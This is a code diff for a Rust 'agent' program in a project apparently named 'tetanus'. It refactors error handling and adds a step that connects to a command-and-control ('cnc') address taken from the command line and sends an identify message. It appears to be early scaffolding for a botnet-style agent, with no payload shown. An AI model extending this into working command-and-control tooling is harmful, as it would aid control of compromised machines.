@@ -1,43 +1,47 @@
-mod util;
+extern crate tetanus;
+
+use tetanus::Message;
 
 use std::{io, net, env};
+use std::io::Write;
 use std::process::exit;
 use std::str::FromStr;
 
-macro_rules! notify_exit {
-    () => ( exit(1) );
-    ( $( $s:expr )* ) => ( { println!("{}", $($s)*); exit(1) } );
-    ( $( $s:expr )*; $c:expr ) => ( { println!("{}", $($s)*); exit($c) } )
-}
-
-fn parse_arg<T: FromStr>(n: usize) -> Option<T> {
+fn parse_arg<T: FromStr>(n: usize) -> Option<Result<T, T::Err>> {
     match env::args().nth(n) {
-        Some(opt) => match opt.parse::<T>() {
-            Ok(res) => Some(res),
-            Err(_)  => None
-        }
-        None => None,
+        Some(opt) => Some(opt.parse::<T>()),
+        None      => None,
     }
 }
 
-fn main() {
+fn send_msg(mut stream: net::TcpStream, msg: Message) -> io::Result<()> {
+    stream.write(&msg.as_bytes())?;
+    Ok(())
+}
+
+fn run() -> Result<(), tetanus::Error> {
     if env::args().len() < 3 {
-        notify_exit!("Usage: ./agent [ip] [port]")
+        return Err(tetanus::Error::Argument)
     } 
 
-    let cnc_ip: net::IpAddr = match parse_arg(1) {
-        Some(i) => i,
-        None    => notify_exit!("Failed to parse address")
-    };
+    // parse_arg should never return None
+    let cnc_ip: net::IpAddr = parse_arg(1).unwrap()?;
+    let cnc_port: u16 = parse_arg(2).unwrap()?;
 
-    let cnc_port: u16 = match parse_arg(2) {
-        Some(p) => p,
-        None    => notify_exit!("Failed to parse port")
-    };
+    let cnc = net::TcpStream::connect((cnc_ip, cnc_port))?;
+    send_msg(cnc, Message::identify())?;
 
-    if let Ok(cnc) = net::TcpStream::connect((cnc_ip, cnc_port)) {
+    Ok(())
+}
 
-    } else {
-        notify_exit!("Failed to connect to remote server");
+fn main() {
+    let result = run();
+
+    match result {
+        Ok(_)  => exit(0),
+        Err(e) => {
+            eprintln!("{}", e);
+            exit(1)
+        }
     }
 }
